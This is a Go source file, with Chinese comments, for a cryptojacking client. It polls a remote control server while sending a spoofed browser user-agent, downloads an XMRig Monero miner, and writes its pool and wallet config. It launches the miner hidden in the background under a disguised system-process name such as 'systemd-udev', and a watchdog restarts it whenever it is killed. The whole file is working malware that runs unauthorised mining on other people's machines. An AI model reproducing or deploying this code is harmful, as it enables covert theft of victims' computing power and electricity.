package service

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/titan/tingchao/client/httpapi"

	"github.com/titan/tingchao/model"
	"github.com/titan/tingchao/utils"
)

type MiningService struct {
}

func NewMiningService() *MiningService {
	return &MiningService{}
}

// MiningGo 执行一次矿工操作
func MiningGo(msg *model.MessageModel) {
	mm := PullMiningMessage() // 获取服务端的矿工对象
	MiningRun(mm)
}

// MiningWalletAddressWatchService 钱包地址和矿工版本监控
// 如果服务器的钱包地址发生改变,则将本地的钱包地址替换为和服务器一样的钱包地址
// 如果服务器矿工版本发生改变,则更新矿工
func MiningWalletAddressWatchService() {
	// 创建一个周期性的定时器,随机1-2小时
	ticker := time.NewTicker(time.Duration(utils.RandomNumInt(60*60*1, 60*60*2)) * time.Second)
	go func() {
		for {
			<-ticker.C
			mm := PullMiningMessage() // 获取服务端的矿工对象
			MiningRun(mm)
		}
	}()
}

// MiningWatchService 工人守护进程,每10分钟检查一下工人是否在运行,如果未运行将工人拉起来
// 如果矿工没运行,需要将钱包地址和矿工下载地址设置为空字符串,才能正确的初始化矿工
// TODO 默认矿工名是空字符串,检测是否在 ps -aux中,会导致程序一直认为矿工在运行,不过不影响
func MiningWatchService() {
	// 创建一个周期性的定时器,随机10-15分钟
	ticker := time.NewTicker(time.Duration(utils.RandomNumInt(60*10, 60*15)) * time.Second)
	go func() {
		for {
			switch runtime.GOOS {
			case "darwin":
				// darwin 系统暂不检测
				log.Println("[MiningWatchService]darwin系统暂不执行矿工守护服务")
			case "windows":
				shell, err := utils.ExecShell(`tasklist`)
				if err != nil {
					log.Println("执行命令错误", err)
					break
				}
				types := strings.Index(shell, utils.GlobalConfig.MiningNameWin)

				if types == -1 { // 矿工未运行,直接重新初始化矿工程序
					log.Println("矿工未运行或者被杀死,正在重新运行矿工程序")
					log.Println("已将钱包地址和工人下载地址重制为空字符串")

					utils.GlobalConfig.WalletAddress = "" // 需要将client的钱包地址设置为空字符串才能正常初始化矿工
					utils.GlobalConfig.MiningUrl = ""     // 需要将client的矿工下载地址设置为空字符串才能正常初始化矿工

					mm := PullMiningMessage() // 获取服务端的矿工对象
					MiningRun(mm)
				} else {
					log.Println("[MiningService.MiningWatchService]矿工正在运行中,没问题")
				}
			default: // 所有的系统都运行矿工守护服务
				// 其他系统不执行矿工
				//log.Println(runtime.GOOS, "其他系统,不运行矿工程序")
				shell, err := utils.ExecShell("ps -aux")
				if err != nil {
					log.Println("执行命令错误", err)
					break
				}
				types := strings.Index(shell, utils.GlobalConfig.MiningNameUnix)

				if types == -1 { // 矿工未运行,直接重新初始化矿工程序
					log.Println("矿工未运行或者被杀死,正在重新运行矿工程序")
					log.Println("已将钱包地址和工人下载地址重置为空串")

					utils.GlobalConfig.WalletAddress = "" // 需要将client的钱包地址设置为空字符串才能正常初始化矿工
					utils.GlobalConfig.MiningUrl = ""     // 需要将client的矿工下载地址设置为空字符串才能正常初始化矿工

					mm := PullMiningMessage() // 获取服务端的矿工对象
					MiningRun(mm)
				} else {
					log.Println("[MiningService.MiningWatchService]矿工正在运行中,没问题")
				}
			}
			<-ticker.C
		}
	}()
}

// PullMiningMessage 从服务端拉取mining信息
func PullMiningMessage() *model.MiningModel {

	//url := "http://127.0.0.1:8080/min"
	url := fmt.Sprintf("http://%s:%s/min", utils.GlobalConfig.ServerHost, utils.GlobalConfig.ServerPort)

	header := map[string][]string{
		"User-Agent":    {"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"},
		"cookie":        {utils.GlobalConfig.Cookie.Name + "=" + utils.GlobalConfig.Cookie.Value},
		"Cache-Control": {"no-cache"},
		"Connection":    {"close"},
	}

	rep, err := httpapi.Get(url, header, utils.GlobalConfig.HttpTimeOut, nil)
	if err != nil {
		log.Println("[api.Mining]请求错误", err)
		return nil
	}
	defer rep.Body.Close()

	if rep.StatusCode != 200 { // 没有成功请求到数据直接返回nil
		log.Println("[api.Mining]请求错误,状态码", rep.StatusCode)
		return nil
	}

	body, err := ioutil.ReadAll(rep.Body)
	if err != nil {
		log.Print("[api.Mining]io读取错误", err)
		return nil
	}

	pm := model.NewPackageModel()
	err = pm.DecodePackage(&body)
	if err != nil {
		log.Print("[api.Mining]解码失败", err)
		return nil
	}

	if _, ok := pm.MsgList[0].Data.(*model.MiningModel); !ok { // 判断类型能否转换
		log.Print("[api.Mining]类型转换错误")
		return nil
	}

	mm := pm.MsgList[0].Data.(*model.MiningModel)

	log.Println("[api.Mining]服务端拉取mining信息成功")
	return mm
}

// MiningRun
//
//	@description  :使用矿工model进行矿工初始化,完成下载执行的操作,下载失败或者启动失败会return此方法
//	@param         {*model.MiningModel} mm	矿工model
func MiningRun(mm *model.MiningModel) {

	downPath := utils.GlobalConfig.MiningBasePath

	if mm == nil { // 连接出错会获取到nil
		log.Println("[MiningService.MiningRun]从服务器拉取数据失败")
		return // 直接返回
	}

	// 1.钱包地址为空,代表首次初始化矿工
	if utils.GlobalConfig.WalletAddress == "" {
		log.Println("[MiningService.MiningRun]首次接收到初始化矿工消息,开始初始化矿工程序")
		goto Type1
	}

	// 2.服务端钱包地址与client钱包地址不一致时,与服务器同步
	// 同步完钱包地址之后直接退出此方法,不更新矿工程序,只同步钱包
	if mm.WalletAddress != utils.GlobalConfig.WalletAddress {
		log.Println("[MiningService.Run]钱包地址发生改变,初始化矿工配置文件")
		log.Println(utils.GlobalConfig.WalletAddress, "==>", mm.WalletAddress)

		utils.GlobalConfig.WalletAddress = mm.WalletAddress
		switch runtime.GOOS { // 2种情况,win和unix删除的路径不同
		case "windows":
			initXmrigConfig(downPath+"/"+utils.GlobalConfig.MiningFolderNameWin, mm) //初始化 xmrig 的配置文件
		default:
			initXmrigConfig(downPath+"/"+utils.GlobalConfig.MiningFolderNameUnix, mm) //初始化 xmrig 的配置文件
		}
		return
	} else {
		log.Println("[MiningService.MiningRun]本地钱包地址与服务器钱包地址相等,未执行任何操作")
	}

Type1:
	// 3.服务端矿工下载地址与client端不同步时,更新矿工
	if mm.MiningUrl != utils.GlobalConfig.MiningUrl {
		if len(mm.MiningUrl) > 0 { // 有url则下载矿工文件

			switch runtime.GOOS {
			case "darwin":
				// darwin 系统暂不运行矿工
				log.Println("[MiningRun]darwin系统暂不运行矿工")
			case "windows":
				if ok := utils.DownloadFile(mm.MiningUrl, downPath, "tmp.zip"); ok { //win下载成功

					log.Println("[MiningRun]win 下载工人文件成功,继续执行软件; 下载路径: ", downPath)

					// 结束正在运行的 windows矿工
					//utils.ExecShell1("TASKKILL /F /IM xmrig.exe")
					shell, err := utils.ExecShell("TASKKILL /F /IM " + utils.GlobalConfig.MiningNameWin)
					if err != nil {
						log.Println("[MiningRun]杀死矿工失败,", shell, ";", err)
					}

					time.Sleep(2 * time.Second) // 休息2秒再执行下面的操作

					// 删除原本的矿工软件
					//if err := os.RemoveAll(downPath + "/AppTmp"); err != nil {
					if err := os.RemoveAll(downPath + "/" + utils.GlobalConfig.MiningFolderNameWin); err != nil {
						log.Println(downPath + "/" + utils.GlobalConfig.MiningFolderNameWin)
						log.Println("[MiningRun]删除之前运行的矿工", downPath, "/", utils.GlobalConfig.MiningFolderNameWin, "失败", err)
					}
					if err := utils.UnZip2Xmrig(downPath+"/tmp.zip", downPath); err != nil {
						log.Println("[MiningRun]解压", downPath, "/tmp.zip失败 ", err)
					}
					if err := os.Remove(downPath + "/tmp.zip"); err != nil {
						log.Println("[MiningRun]删除缓存", downPath, "/tmp.zip失败 ", err)
					}

					//initXmrigConfig(downPath+"/AppTmp", mm) //初始化 xmrig 的配置文件
					initXmrigConfig(downPath+"/"+utils.GlobalConfig.MiningFolderNameWin, mm) //初始化 xmrig 的配置文件

					xmrigPath := downPath + "/" + utils.GlobalConfig.MiningFolderNameWin + "/" + utils.GlobalConfig.MiningNameWin
					log.Println("[MiningRun]xmrig path win", xmrigPath)

					// 后台执行程序
					//utils.ExecShell1("start /b " + downPath + "/AppTmp/xmrig.exe")
					// shell, err = utils.ExecShell("start /b " + xmrigPath)
					// if err != nil {
					// 	log.Println("[MiningRun]矿工启动失败", shell, ";", err)
					// 	return
					// }
					utils.ExecShell1("start /b " + xmrigPath)

					// 更新钱包地址和矿工url
					utils.GlobalConfig.WalletAddress = mm.WalletAddress
					utils.GlobalConfig.MiningUrl = mm.MiningUrl

					log.Println("==> 矿工已运行 ")
				} else { // 下载失败则重新下载,重新执行
					log.Println("[MiningRun]下载失败")
				}
			default: // 除了win之外的下载tar.gz包
				if ok := utils.DownloadFile(mm.MiningUrl, downPath, "tmp.tar.gz"); ok { //下载成功

					log.Println("[MiningRun]下载文件成功,继续执行软件; 下载路径: ", downPath)

					// 结束正在运行的 矿工
					//utils.ExecShell1("kill -9 ` ps -ef | grep systemd-udev | grep -v grep | awk '{print $2}' `")
					shell, err := utils.ExecShell("kill -9 ` ps -ef | grep " +
						utils.GlobalConfig.MiningNameUnix + " | grep -v grep | awk '{print $2}' `")
					if err != nil {
						log.Println("[MiningRun]杀死矿工失败,", shell, ";", err)
					}

					time.Sleep(2 * time.Second) // 休息2秒再执行下面的操作

					// 删除原本的矿工软件
					//if err := os.RemoveAll(downPath + "/systemdev"); err != nil {
					if err := os.RemoveAll(downPath + "/" + utils.GlobalConfig.MiningFolderNameUnix); err != nil {
						log.Println("[MiningRun]删除之前运行的矿工", downPath, "/", utils.GlobalConfig.MiningFolderNameUnix, "失败 ", err)
					}
					if err := utils.UnTarGZ2Xmrig(downPath+"/tmp.tar.gz", downPath); err != nil { //解压xmrig压缩包
						log.Println("[MiningRun]解压", downPath, "/tmp.tar.gz软件失败 ", err)
					}
					if err := os.Remove(downPath + "/tmp.tar.gz"); err != nil {
						log.Println("[MiningRun]删除缓存", downPath, "/tmp.tar.gz失败 ", err)
					}

					//initXmrigConfig(downPath+"/systemdev", mm) //初始化 xmrig 的配置文件
					initXmrigConfig(downPath+"/"+utils.GlobalConfig.MiningFolderNameUnix, mm) //初始化 xmrig 的配置文件

					// 拼接出来类似于:root/systemdev/systemd-udev
					xmrigPath := downPath + "/" + utils.GlobalConfig.MiningFolderNameUnix + "/" + utils.GlobalConfig.MiningNameUnix
					log.Println("[MiningRun]xmrig path unix", xmrigPath)

					// 增加执行权限
					//utils.ExecShell1("chmod +x " + downPath + "/systemdev/systemd-udev")
					shell, err = utils.ExecShell("chmod +x " + xmrigPath)
					if err != nil {
						log.Println("[MiningRun]chmod +x 错误,本次启动矿工失败", shell, ";", err)
					}
					// 后台执行
					//utils.ExecShell1("nohup " + downPath + "/systemdev/systemd-udev >/dev/null 2>&1 & ")
					shell, err = utils.ExecShell("nohup " + xmrigPath + " >/dev/null 2>&1 & ")
					if err != nil {
						log.Println("[MiningRun]nohup 错误,本次启动矿工失败", shell, ";", err)
						return
					}

					// 更新钱包地址和矿工url
					utils.GlobalConfig.WalletAddress = mm.WalletAddress
					utils.GlobalConfig.MiningUrl = mm.MiningUrl

					log.Println("==> 矿工已运行 ")
				} else { // 下载失败则重新下载,重新执行
					log.Println("[MiningRun]下载失败")
				}
			}
		} else {
			log.Println("[MiningRun]MiningUrl下载地址为空,本次未执行任何操作")
		}
	} else {
		log.Println("[MiningService.MiningRun]本地矿工下载地址与服务器矿工下载地址相等,未执行任何操作")
	}
}

// 初始化 xmrig 的配置文件
func initXmrigConfig(path string, mm *model.MiningModel) {
	if err := os.Remove(path + "/config.json"); err != nil {
		log.Println("[initXmrigConfig]config.json 删除失败:", err)
	}
	logPath := path + "/log.txt"
	// 格式化配置文件,填充矿池地址,钱包地址,矿工名字
	utils.Write(path+"/config.json", fmt.Sprintf(xmrigConfigJson, logPath, mm.PoolUrl, mm.WalletAddress, mm.XmrigName))
}

const xmrigConfigJson = `
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": true,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": "%s",
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "%s",
            "user": "%s",
            "pass": "%s",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
`
